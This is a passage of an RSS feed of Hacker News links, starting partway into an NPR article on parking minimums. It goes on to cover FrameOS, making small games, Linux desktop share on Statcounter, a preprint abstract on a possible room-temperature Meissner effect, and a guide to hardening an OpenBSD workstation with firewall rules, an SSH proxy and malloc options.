https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1600-c85.webp 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1800-c85.webp 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/webp">
            <source srcset="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s400-c85.jpg 400w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s600-c85.jpg 600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s800-c85.jpg 800w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s900-c85.jpg 900w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200-c85.jpg 1200w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1600-c85.jpg 1600w,
https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1800-c85.jpg 1800w" sizes="(min-width: 1300px) 763px, (min-width: 1025px) calc(100vw - 496px), (min-width: 768px) calc(100vw - 171px), calc(100vw - 30px)" type="image/jpeg">
            <img src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1100-c50.jpg" alt="" loading="lazy">
        </picture>
        
</div>
<div>
    <div>
        <p>
                Many cities hope that ditching their parking requirements will make their neighborhoods more amenable to biking and walking. People are seen biking and walking along Park Avenue near Grand Central Station during the Summer Streets initiative in New York City in August 2022.
                <b aria-label="Image credit">
                    
                    Ed Jones/AFP via Getty Images
                    
                </b>
                <b><b>hide caption</b></b>
            </p>


            <p><b><b>toggle caption</b></b>
    </p></div>

    <p><span aria-label="Image credit">
        
        Ed Jones/AFP via Getty Images
        
    </span>
</p></div>
<div>
        <picture>
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.webp" type="image/webp">
            <source data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg" type="image/jpeg">
            <img data-original="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg" alt="" src="https://media.npr.org/assets/img/2023/12/24/gettyimages-1242350775-63eaa1b1eea52c30ead7c3cd10c559a077324dab-s1200.jpg">
        </picture>
    </div>
<div>
        <p>Many cities hope that ditching their parking requirements will make their neighborhoods more amenable to biking and walking. People are seen biking and walking along Park Avenue near Grand Central Station during the Summer Streets initiative in New York City in August 2022.</p>
        <p><span aria-label="Image credit">
            
            Ed Jones/AFP via Getty Images
            
        </span>
    </p></div>
   </div>
   <p>She says the question of whether the city invests in transit and walkability, or doubles down on cars, is decisive in whether she'll live in Austin long-term.</p>   <p>"Like if it doesn't seem like the public transit's going to get better, and if it seems like <a href="https://www.kut.org/transportation/2023-10-16/austin-i-35-expansion-displacements">the highway expansion</a> is going to happen, then I'm probably going to start looking for where else I can live. ... It's a major factor in my life and my happiness. Like sometimes I'm driving on the road and I'll be in traffic or something or even just on the highway, and it's such an ugly landscape," Greco says. "And then I'll think: this isn't really how I want to spend my adult life."</p>   
   <h3>Too much parking can hinder effective transit</h3>   <p>What about the idea that cities without good transit can't cut back on parking?</p>   <p>Jonathan Levine, a professor of urban and regional planning at the University of Michigan who studies transportation policy reform, says cities' parking minimums can make good transit nearly impossible to develop.</p>   <p>"An area that has a lot of parking is transit-hostile territory," he says.</p>   <p>He explains why: When people take transit, they complete their journey by walking to their destination. A sea of parking at the destination makes that walk longer, and it makes the physical environment less appealing to those on foot. </p>   
   
<!-- END ID="RES1221847671" CLASS="BUCKETWRAP INTERNALLINK INSETTWOCOLUMN INSET2COL " -->
   <p>"Who wants to walk by a bunch of parking lots to get to your destination?" Levine notes.</p>   <p>And having tons of parking encourages driving. "If you have parking everywhere that you're going, that parking essentially is calling to the drivers, drive here! Park here! ... So if you keep on designing those areas by governmental mandate, you're creating areas that transit can't serve effectively," says Levine.</p>   <p>Many more U.S. cities – including <a href="https://www.nyc.gov/office-of-the-mayor/news/692-23/mayor-adams-launches-historic-effort-build-a-little-more-housing-every-neighborhood-">New York City</a>, <a href="https://www.wpr.org/milwaukee-zoning-code-housing-growing-mke">Milwaukee</a>, and <a href="https://www.keranews.org/news/2023-09-06/dallas-officials-discussing-possible-elimination-of-minimum-parking-requirements-in-the-city">Dallas</a> — are exploring getting rid of their parking minimums too. Duluth, Minn., lifted its parking mandates <a href="https://www.duluthnewstribune.com/news/local/duluth-lifts-parking-mandates-looks-to-sell-pair-of-ramps">in December</a>.</p>   <p>Levine says getting rid of these rules is good news for cities.</p>   <p>"It's a huge drag on housing affordability. And it's a huge impediment for cities fulfilling their destiny, which is enabling human interaction. Because what parking does is it separates land uses, separates people. It makes cities have a much more sprawling physical profile than they otherwise would have."</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: FrameOS – operating system for single function smart frames (271 pts)]]></title>
            <link>https://frameos.net/</link>
            <guid>38855337</guid>
            <pubDate>Wed, 03 Jan 2024 15:42:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://frameos.net/">https://frameos.net/</a>, See on <a href="https://news.ycombinator.com/item?id=38855337">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>FrameOS is an <strong>operating system for single function smart frames</strong>. </p><p>It's meant to be deployed on a Raspberry Pi, and can be used with a variety of e-ink and traditional displays. It's designed for both screens that update <strong>60 seconds per frame</strong>, and for screens that update <strong>60 frames per second</strong>.</p><p>Think smart home calendars, meeting room displays, thermostats, industrial dashboards, public advertisement screens, and more. </p><p>Features:</p><ol><li><p><strong>Centralized Deployment:</strong> The FrameOS Controller connects to Raspberry Pis via SSH for direct software installation.</p></li><li><p><strong>Compiled &amp; Efficient</strong>: FrameOS is written <a href="https://nim-lang.org/" target="_blank" rel="noopener noreferrer">in Nim</a>, a compiled language. Your final configuration gets compiled down into a single efficient binary that contains all apps, assets and drivers.</p></li><li><p><strong>Diagram Editor</strong>: A drag-and-drop interface to combine Nim apps into scenes. Fork and edit existing apps like "OpenAI image", and "Text overlay" to suit your needs. Overwrite all fields with inline code snippets.</p></li><li><p><strong>GPT4 Support</strong>: Ask your favourite LLM to write and debug FrameOS apps for you.</p></li><li><p><strong>Hardware Guides</strong>: For tested displays, we provide hardware guides, installation instructions, and 3D printable cases.</p></li></ol><p><img loading="lazy" src="https://frameos.net/assets/images/nim-vannituba2-0faea8461e3c4fdc214704a5fea11929.png" width="3360" height="1922"></p><h2 id="getting-started">Getting started<a href="#getting-started" aria-label="Direct link to Getting started" title="Direct link to Getting started">​</a></h2><ol><li>Start by installing the <a href="https://frameos.net/installation/controller">FrameOS controller</a>.</li><li>Then set up <a href="https://frameos.net/installation/raspberry">the raspberry</a>, while following the <a href="https://frameos.net/devices">device guide</a> for your specific screen.</li></ol><h2 id="supported-platforms">Supported platforms<a href="#supported-platforms" aria-label="Direct link to Supported platforms" title="Direct link to Supported platforms">​</a></h2><p>We support all the most common e-ink displays out there.</p><ul><li>Pimoroni e-ink frames</li><li>Waveshare e-ink</li><li>Framebuffer HDMI output</li><li>Web server kiosk mode</li></ul><p><a href="https://frameos.net/devices">See the full list here!</a></p><p><img loading="lazy" alt="FrameOS Frames" src="https://frameos.net/assets/images/1-frames-d127cdd40eaec7b65932a78a7a2034ae.jpg" width="4371" height="3129"></p><h2 id="status">Status<a href="#status" aria-label="Direct link to Status" title="Direct link to Status">​</a></h2><p>FrameOS is <strong>good enough for home and hobbyist usage</strong>.</p><p>This software is still in early development, and does not have a stable release. A docker image is generated for every push to <code>main</code>. There are no guarantees things won't suddenly break between releases, despite our best efforts.</p><p>If you're the adventurous type, please try it out, and help out. Look at <a href="https://github.com/FrameOS/frameos/issues/1" target="_blank" rel="noopener noreferrer">the tasklist</a> for ideas. Don't ask for permission, just submit a PR. If you're not sure, open an issue and we'll discuss it.</p><h2 id="why">Why?<a href="#why" aria-label="Direct link to Why?" title="Direct link to Why?">​</a></h2><ul><li><p>Read the blog post: <a href="https://frameos.net/blog/why-frameos">Why FrameOS?</a></p></li><li><p>Read more about the <a href="https://frameos.net/blog/nim-rewrite">Nim rewrite</a>.</p></li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Making small games, which is fun in itself (178 pts)]]></title>
            <link>https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html</link>
            <guid>38854596</guid>
            <pubDate>Wed, 03 Jan 2024 14:42:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html">https://abagames.github.io/joys-of-small-game-development-en/fun_to_make_small_games.html</a>, See on <a href="https://news.ycombinator.com/item?id=38854596">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
                                
                                
<p>Creating small games is an enjoyable endeavor in itself. So what constitutes a small game? According to the 'Small Game Manifesto', <sup><a href="#fn_1" id="reffn_1">1</a></sup> it refers to games that conclude within 10 minutes and can be easily played on browsers.</p>
<p>By this definition, I have already created over 350 small games.<sup><a href="#fn_2" id="reffn_2">2</a></sup> There was a year when I crafted 139 of these small games,<sup><a href="#fn_3" id="reffn_3">3</a></sup> showcasing my undeniable love for them.</p>
<p>Take for instance, a simple game where you slice a red stick into equal parts, which exemplifies a small game (click the image below to play directly in the browser).</p>
<p><a href="https://abagames.github.io/crisp-game-lib-11-games/?timbertest" target="_blank"><img src="https://github.com/abagames/crisp-game-lib-11-games/raw/main/docs/timbertest/screenshot.gif" alt="TIMBER TEST"></a></p>
<p>Another example is a game where you cut a rope with a tap, ensuring it doesn't touch the bottom of the screen, also a small game, enjoyable on touch panel devices like smartphones.</p>
<p><a href="https://abagames.github.io/crisp-game-lib-games/?cnodes" target="_blank"><img src="https://github.com/abagames/crisp-game-lib-games/raw/main/docs/cnodes/screenshot.gif" alt="C NODES"></a></p>
<p>The allure of small games lies in the abbreviated development time they require. A game could be quickly whipped up in about 2 hours, or within around 10 hours if met with challenges. However, once you start diving into artwork, the time investment can become endless. The small games discussed in this article are those produced under initiatives such as "Game A Week,"<sup><a href="#fn_4" id="reffn_4">4</a></sup> in which developers aim to produce a new game each week. These games, even from a developer's standpoint, are considered small due to the constrained time frame in which they are developed.</p>
<p>The abbreviated development time means you can easily experiment with various ideas. I’ve enjoyed crafting and testing unconventional games.</p>
<p>The common narrative surrounding small games posits that creating them is a crucial preparatory step towards developing larger, more polished games. Many articles overwhelmingly advise beginners to start with small games.</p>
<p>A blog post titled "Make and release lots of small games before making a big one" <sup><a href="#fn_5" id="reffn_5">5</a></sup> emphasizes the importance of this practice before embarking on larger projects.</p>
<blockquote>
<p>It's here because, jumping straight into a big game as your "first" game is exactly how you end up losing motivation and never finishing that game, or ending up with something that ate years of your life that you can't even stand looking at anymore.</p>
</blockquote>
<p>But the story doesn’t end there. Small games possess a unique charm exclusive to them. That's what I believe.</p>
<p>There's a blog post titled "How To Make Good Small Games",<sup><a href="#fn_6" id="reffn_6">6</a></sup> elucidating that excellent small games do exist and detailing how to create them.</p>
<blockquote>
<p>This manifesto of sorts, “How to Make Good Small Games”, is an attempt to meet this perspective halfway. It’s divided into twelve thoughts, made up mostly of esoteric creative theory (why do I like small games? why do I like making small games?), and hopefully a little actionable advice. I can tell you “scope small uwu”, but if you don’t believe small games can be good in the first place, all you’ll hear is a homework assignment you have to do before you can make the games you really care about.</p>
</blockquote>
<p>The 12 thoughts encompass the following:</p>
<ol>
<li><p>A game’s quality is independent from its scale.: Small games are not only easy to create but also to make well. The larger the game, the more aspects within it need attention, and the higher the chance of failure.</p>
</li>
<li><p>A game’s quality is independent from its emotional scope.: Just as short stories function differently from long novels or epics, the conditions constituting “success” vary in small-scale games.</p>
</li>
<li><p>A game defines the terms of its own success.: Accept them as they are, and assess whether that's good or bad.</p>
</li>
<li><p>A game succeeds when it fulfills its promises.: The introduction of new characters or mechanics is a promise. Instead of introducing an interesting idea and quickly abandoning it, ensure it evolves and contributes to the game's overall progression.</p>
</li>
<li><p>It's easier for a game to succeed if it makes smaller promises.: Reduce the mechanics, enemies, assets, characters, and stages. It's easier to introduce three ideas and develop them to a satisfying climax than to juggle 10 or 100 ideas.</p>
</li>
<li><p>Fulfill promises in an interesting and delightful way.: What makes you smile? This is where your personal style shines through in creating a game that feels authentically "you".</p>
</li>
<li><p>Don’t over-deliver on your promises.: Games should conclude at the right moment, not extending unnecessarily.</p>
</li>
<li><p>Form factor is a part of a game’s promises.: Minimize information presented to players, and ensure they can commence playing as soon as the game launches, altering player expectations.</p>
</li>
<li><p>Finish your game before releasing it.: Before releasing under labels like “Demo” or subtitling it “Prologue”, question why you would wish to release it before completion.</p>
</li>
<li><p>Serial games are not a shortcut.: Splitting the game into two or more episodes released over an extended period is almost always a bad idea.</p>
</li>
<li><p>Don’t worry about going viral.: Pursuing small, specific goals in games also attracts a small, specific audience.</p>
</li>
<li><p>Good is good enough.: Once you can consistently create games that satisfy you and feel genuinely good, you’re light-years ahead of many game developers.</p>
</li>
</ol>
<p>Additionally, the article in discussion presents a 13th thought: "Have fun :)". Conceptualize new mechanics and integrate them into your game in a manner that reflects your style. I find this process enjoyable, and it’s even more gratifying if a fair number of people experience and enjoy what I’ve created.</p>
<p>Creating small games is often discussed within the context of honing game development skills. However, the process of brainstorming diverse game ideas, experimenting, riding the roller coaster of elation and disappointment, and occasionally showcasing your work to others is itself enjoyable, which is an invaluable experience.</p>
<hr>
<blockquote id="fn_1">
<sup>1</sup>. <a href="https://ebeth.itch.io/small-games-manifesto" target="_blank">Small Games Manifesto</a> for <a href="https://itch.io/jam/manifesto-jam" target="_blank">Manifesto Jam</a><a href="#reffn_1" title="Jump back to footnote [1] in the text."> ↩</a>
</blockquote>
<blockquote>
<p>Small Games should be 10 minutes or less and it's best if they're playable in a web browser.</p>
</blockquote>
<blockquote id="fn_2">
<sup>2</sup>. <a href="http://www.asahi-net.or.jp/~cs8k-cyu/" target="_blank">ABA Games</a><a href="#reffn_2" title="Jump back to footnote [2] in the text."> ↩</a>
</blockquote>
<blockquote id="fn_3">
<sup>3</sup>. <a href="https://dev.to/abagames/i-have-created-139-games-in-one-year-by-patterning-my-game-making-gc2" target="_blank">I have created 139 games in one year by patterning my game making</a><a href="#reffn_3" title="Jump back to footnote [3] in the text."> ↩</a>
</blockquote>
<blockquote id="fn_4">
<sup>4</sup>. <a href="https://www.gamedeveloper.com/audio/game-a-week-getting-experienced-at-failure" target="_blank">Game A Week: Getting Experienced At Failure</a><a href="#reffn_4" title="Jump back to footnote [4] in the text."> ↩</a>
</blockquote>
<blockquote id="fn_5">
<sup>5</sup>. <a href="https://tylerglaiel.substack.com/p/make-and-release-lots-of-small-games" target="_blank">Make and release lots of small games before making a big one</a><a href="#reffn_5" title="Jump back to footnote [5] in the text."> ↩</a>
</blockquote>
<blockquote id="fn_6">
<sup>6</sup>. <a href="https://farawaytimes.blogspot.com/2023/02/how-to-make-good-small-games.html" target="_blank">How To Make Good Small Games</a><a href="#reffn_6" title="Jump back to footnote [6] in the text."> ↩</a>
</blockquote>

                                
                                </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Linux hits nearly 4% desktop user share on Statcounter (222 pts)]]></title>
            <link>https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/</link>
            <guid>38853877</guid>
            <pubDate>Wed, 03 Jan 2024 13:37:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/">https://www.gamingonlinux.com/2024/01/linux-hits-nearly-4-desktop-user-share-on-statcounter/</a>, See on <a href="https://news.ycombinator.com/item?id=38853877">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p>According to Statcounter, which should be taken with a pinch of salt of course like any sampling, the Linux share on the desktop hit nearly 4% in Decemeber 2023. Last month was a record too and a clear trend over time, as going back a couple of years, it was rarely coming close to 2% but now it's repeatedly nearing 4% so it's quite a good sign overall.</p>
<p>The latest from Statcounter shows for all of 2023 below:</p>
<ul>
<li>January - 2.91%</li>
<li>February - 2.94%</li>
<li>March - 2.85%</li>
<li>April - 2.83%</li>
<li>May - 2.7%</li>
<li>June - 3.07%</li>
<li>July - 3.12%</li>
<li>August - 3.18%</li>
<li>September - 3.02%</li>
<li>October - 2.92%</li>
<li>November - 3.22%</li>
<li><strong>December - 3.82%</strong></li>
</ul>
<p>Looking at December it shows Windows rising too, with macOS dropping down. If we actually take ChromeOS directly into the Linux numbers for December 2023 the overall number would actually be 6.24% (ChromeOS is Linux after all).</p>
<p>Here's how just Linux looks over time on Statcounter since early 2009 until now:</p>
<p><a data-fancybox="images" href="https://uploads.golmedia.net/uploads/articles/article_media/996456521704281563gol1.png" target="_blank"><img src="https://uploads.golmedia.net/uploads/articles/article_media/996456521704281563gol1.png"></a></p>
<p>Seems like a pretty clear trend over time don't you think? Nice to see this happening elsewhere, just like we've seen over years <a href="https://www.gamingonlinux.com/2024/01/linux-use-on-steam-ends-2023-with-a-multi-year-high-thanks-steam-deck/" target="_blank">with the Steam Survey</a>.</p>
<p>You can see their stats <a href="https://gs.statcounter.com/os-market-share/desktop/worldwide" target="_blank">over here</a>.</p>
<p><span>Article taken from <a href="https://www.gamingonlinux.com/">GamingOnLinux.com.</a></span>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Possible Meissner effect near room temperature: copper-substituted lead apatite (451 pts)]]></title>
            <link>https://arxiv.org/abs/2401.00999</link>
            <guid>38853706</guid>
            <pubDate>Wed, 03 Jan 2024 13:19:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2401.00999">https://arxiv.org/abs/2401.00999</a>, See on <a href="https://news.ycombinator.com/item?id=38853706">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2401.00999.pdf">Download PDF</a>
    <a href="https://browse.arxiv.org/html/2401.00999v1">HTML (experimental)</a></p><blockquote>
            <span>Abstract:</span>With copper-substituted lead apatite below room temperature, we observe diamagnetic dc magnetization under magnetic field of 25 Oe with remarkable bifurcation between zero-field-cooling and field-cooling measurements, and under 200 Oe it changes to be paramagnetism. A glassy memory effect is found during cooling. Typical hysteresis loops for superconductors are detected below 250 K, along with an asymmetry between forward and backward sweep of magnetic field. Our experiment suggests at room temperature the Meissner effect is possibly present in this material.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Yao Yao [<a href="https://arxiv.org/show-email/3ff8ef53/2401.00999">view email</a>]      <br>    <strong>[v1]</strong>
        Tue, 2 Jan 2024 02:53:38 UTC (237 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenBSD Workstation Hardening (126 pts)]]></title>
            <link>https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html</link>
            <guid>38853406</guid>
            <pubDate>Wed, 03 Jan 2024 12:44:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html">https://dataswamp.org/~solene/2023-12-31-hardened-openbsd-workstation.html</a>, See on <a href="https://news.ycombinator.com/item?id=38853406">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<article id="20231231">
  <header>
  
    
    <p>Written by <em>Solène</em>, on 31 December 2023.<br>Tags: 
<span><a href="https://dataswamp.org/~solene/tag-security.html">#security</a></span>


<span><a href="https://dataswamp.org/~solene/tag-openbsd.html">#openbsd</a></span>


<span><a href="https://dataswamp.org/~solene/tag-unix.html">#unix</a></span>

</p>
    
    
  </header>
  <h2 id="_Introduction">1. Introduction <a href="#_Introduction">§</a></h2>
<p>I wanted to share a list of hardening you can do on your OpenBSD workstation, and explaining the threat model of each change.
</p>
<p><a href="https://www.openbsd.org/">OpenBSD official project website</a></p>
<p>Feel free to pick any tweak you find useful for your use-case, many are certainly overkill for most people, but depending on the context, these changes could make sense for others.
</p>
<h2 id="_User_configuration">2. User configuration <a href="#_User_configuration">§</a></h2>
<p>There are some tweaks that could be done in the configuration of a user to improve the security.
</p>
<h2 id="_The_Least_privileges">2.1. The Least privileges <a href="#_The_Least_privileges">§</a></h2>
<p>In order to prevent a program to escalate privileges, remove yourself from the wheel group, and don't set any doas or sudo permission.
</p>
<p>If you need root privileges, switch to a TTY using the root user.
</p>
<h2 id="_Multiple-factor_authentication">2.2. Multiple-factor authentication <a href="#_Multiple-factor_authentication">§</a></h2>
<p>In some cases, it may be desirable to have a multiple factor authentication, this mean that in order to log in your system, you would need a TOTP generator (phone app typically, or a password manager such as KeePassXC) in addition to your regular password.
</p>
<p>This would protect against people nearby who may be able to guess your system password.
</p>
<p>I already wrote a guide explaining how to add TOTP to an OpenBSD login.
</p>
<p><a href="https://dataswamp.org/~solene/2021-02-06-openbsd-2fa.html">Blog post: Multi-factor authentication on OpenBSD</a></p>
<h2 id="_Home_directory_permission">2.3. Home directory permission <a href="#_Home_directory_permission">§</a></h2>
<p>The permissions of the user directory should be 700, so only the owner and root could browse it.
</p>
<p>Ideally, you should add <code>umask 077</code> to your user environment, so every new directory or file permissions will be restricted to your user only.
</p>
<h2 id="_Firewall">3. Firewall <a href="#_Firewall">§</a></h2>
<p>There are some interesting policies to configure with the help of OpenBSD firewall Packet Filter.
</p>
<h2 id="_Block_inbound">3.1. Block inbound <a href="#_Block_inbound">§</a></h2>
<p>By default, it's good practice to disable all incoming traffic except the responses to established sessions (so servers can reply to your requests).  This protects against someone on your local network / VPN to access network services that would be listening on the network interfaces.
</p>
<p>In <code>/etc/pf.conf</code> you would have to replace the default:
</p>
<pre><code>block return
pass
</code></pre>
<p>By the following:
</p>
<pre><code>block all
pass out inet
# allow ICMP because it's useful
pass in proto icmp
</code></pre>
<p>Then, reload with <code>pfctl -f /etc/pf.conf</code>, if you ever need to allow a port on the network, add the according rule in the file.
</p>
<h2 id="_Filter_outbound">3.2. Filter outbound <a href="#_Filter_outbound">§</a></h2>
<p>It may be useful and effective to block outbound traffic, but this only work effectively if you know exactly what you need because you will have to allow hosts and remote ports manually.
</p>
<p>It would protect against a program trying to exfiltrate data using a non-allowed port/host.
</p>
<h2 id="_Disabling_network_for_the_desktop_user">4. Disabling network for the desktop user <a href="#_Disabling_network_for_the_desktop_user">§</a></h2>
<p>Disabling network by default is an important mitigation in my opinion.  This will protect against any program your run and try to act rogue, if they can't figure there is a proxy, they won't be able to connect to the Internet.
</p>
<p>This could also save you from mistaken commands that would pull stuff from the network like pip, npm and co.  I think it's always great to have a tight control on which program should do networking and which shouldn't.  On Linux this is actually easy to do, but on OpenBSD we can't restrict a single program so a proxy is the only solution.
</p>
<p>This can be done by creating a new user named <code>_proxy</code> (or whatever the name you prefer) using <code>useradd -s /sbin/nologin -m _proxy</code> and adding your SSH key to its authorized_keys file.
</p>
<p>Add this rule at the end of your file <code>/etc/pf.conf</code> and then reload with <code>pfctl -f /etc/pf.conf</code>:
</p>
<pre><code>block return out proto {tcp udp} user solene
</code></pre>
<p>Now, if you want to allow a program to use the network, you need to:
</p>
<ul>

  <li>toggle the proxy ON with the command: <code>ssh -N -D 10000 _proxy@localhost</code> which is only possible if your SSH private key is unlocked</li>
  <li>configure a SOCKS5 proxy in the program</li>
</ul>

<h3 id="_Some_network_fixes">4.0.1. Some network fixes <a href="#_Some_network_fixes">§</a></h3>
<p>Most programs will react to a proxy configured in a variable named <code>http_proxy</code> or <code>https_proxy</code> or <code>all_proxy</code>, however it's not a good idea to globally define these variables for your user as it would be a lot easier to a program to use the proxy automatically, which is against the essence of this proxy.
</p>
<h4 id="_SSH">4.0.1.1. SSH <a href="#_SSH">§</a></h4>
<p>By default, you won't be able to ssh to anything except on a local user, we need to proxy every remote ssh connection through the local _proxy user.
</p>
<p>In <code>~/.ssh/config</code>:
</p>
<pre><code>Host localhost
User _proxy
ControlMaster auto
ControlPath ~/.ssh/%h%p%r.sock
ControlPersist 60

Host *.*
ProxyJump localhost
</code></pre>
<h4 id="_Chromium">4.0.1.2. Chromium <a href="#_Chromium">§</a></h4>
<p>If you didn't configure GNOME proxy settings, Chromium / Ungoogled Chromium won't use a proxy, except if you add a command line parameter <code>--proxy-server=socks5://localhost:10000</code>.
</p>
<p>I tried to manually modified the dconf database where the "GNOME" settings are to configure the proxy, but I didn't get it to work (it used to work for me, but I can't succeed anymore).
</p>
<h4 id="_Syncthing">4.0.1.3. Syncthing <a href="#_Syncthing">§</a></h4>
<p>If you use syncthing, you need to proxy all its traffic through the SSH tunnel. This is done by setting the environment variable <code>all_proxy=socks5://localhost:10000</code> in the program environment.
</p>
<h2 id="_Live_in_a_temporary_file-system">5. Live in a temporary file-system <a href="#_Live_in_a_temporary_file-system">§</a></h2>
<p>It's possible to have most of your home directory be a temporary file system living in memory, with a few directories with persistency.
</p>
<p>This change would prevent anyone from using temporary files or cache left-over from previous session.
</p>
<p>The most efficient method to achieve this is to use the program home-impermanence that I wrote for this use case, it handles a list of files/directories that should be persistent.
</p>
<p><a href="https://dataswamp.org/~solene/2022-03-15-openbsd-impermanence.html">Blog post: Reproducible clean $HOME on OpenBSD using impermanence</a></p>
<p>If you only want to start fresh using a template (that doesn't evolve on use), you can check the flag <code>-P</code> of <code>mount_mfs</code> which allows populating the fresh memory based file system using an existing directory.
</p>
<p><a href="https://man.openbsd.org/mount_mfs">OpenBSD man page: mount_mfs(8)</a></p>
<h2 id="_Disable_webcam_and_microphone">6. Disable webcam and microphone <a href="#_Disable_webcam_and_microphone">§</a></h2>
<p>Good news!  I take the opportunity here to remember OpenBSD disables by default the video and audio recording of the various capable devices, instead, they will appear to work but record empty stream of data.
</p>
<p>They can be manually enabled by changing the sysctls <code>kern.audio.record</code> or <code>kern.video.record</code> to 1 when you need to use them.
</p>
<h2 id="_Disabling_USB_ports">7. Disabling USB ports <a href="#_Disabling_USB_ports">§</a></h2>
<p>If you need to protect your system from malicious USB devices (usually in an office environment), you should disable them in the BIOS/Firmware if possible.
</p>
<p>If it's not possible, then you could still disable the kernel drivers at boot time using this method.
</p>
<p>Create the file <code>/etc/bsd.re-config</code> and add the content to it:
</p>
<pre><code>disable usb
disable xhci
</code></pre>
<p>This will disable the support for USB 3 and 2 controllers.  On a desktop computer, you may want to use PS/2 peripherals in these conditions.
</p>
<h2 id="_System-wide_services">8. System-wide services <a href="#_System-wide_services">§</a></h2>
<h2 id="_Clamav_antivirus">8.1. Clamav antivirus <a href="#_Clamav_antivirus">§</a></h2>
<p>While this one may make you smile, if there is a chance it saves you once, I think it's still a valuable addition to any kind of hardening.  A downloaded attachment from an email, or rogue JPG file could still harm your system.
</p>
<p>OpenBSD ships a fully working clamav service, don't forget to enable freshclam, the viral database updater.
</p>
<h2 id="_Auto-update">8.2. Auto-update <a href="#_Auto-update">§</a></h2>
<p>I already covered it in a previous article about anacron, but in my opinion, auto-updating the packages and base system daily on a computer is the minimum that should be done everywhere.
</p>
<p><a href="https://dataswamp.org/~solene/2023-06-28-anacron.html#_Useful_examples">Anacron: useful OpenBSD examples</a></p>
<h2 id="_System_configuration">9. System configuration <a href="#_System_configuration">§</a></h2>
<h2 id="_Memory_allocation_hardening">9.1. Memory allocation hardening <a href="#_Memory_allocation_hardening">§</a></h2>
<p>The OpenBSD malloc system allows you to enable some extra checks, like use after free, heap overflow or guard pages, they can be all enabled at once.  This is really efficient for security as most security exploits relies on memory management issues, BUT it may break software that have memory management issues (there are many of them).  Using this mode will also impact the performance negatively, as the system needs to do more checks for each piece of allocated memory.
</p>
<p>In order to enable it, add this to <code>/etc/sysctl.conf</code>:
</p>
<pre><code>vm.malloc_conf=S
</code></pre>
<p>It can be immediately enabled with <code>sysctl vm.malloc_conf=S</code>, and disabled by setting no value <code>sysctl vm.malloc_conf=""</code>.
</p>
<p>The program <code>ssh</code> and <code>sshd</code> always run with this flag enabled, even if it's disabled system-wide.
</p>
<h2 id="_Some_ideas_to_go_further">10. Some ideas to go further <a href="#_Some_ideas_to_go_further">§</a></h2>
<h2 id="_Specialized_proxies">10.1. Specialized proxies <a href="#_Specialized_proxies">§</a></h2>
<p>It could be possible to have different proxy users, with each restriction to the remote ports allowed, we could imagine proxies like:
</p>
<ul>

  <li>http / https / ftp</li>
  <li>ssh only</li>
  <li>imap / smtp</li>
  <li>etc....</li>
</ul>

<p>Of course, this is even more tedious than the multipurpose proxy, but at least, it's harder for a program to guess what proxy to use, especially if you don't connect them all at once.
</p>
<h2 id="_Run_process_using_dedicated_users">10.2. Run process using dedicated users <a href="#_Run_process_using_dedicated_users">§</a></h2>
<p>I wrote a bit about this in the past, for command line programs, running them in dedicated local users over SSH make sense, as long as it's still practical.
</p>
<p><a href="https://dataswamp.org/~solene/2019-11-12-dedicated-users-processes.html">Dedicated users to run processes</a></p>
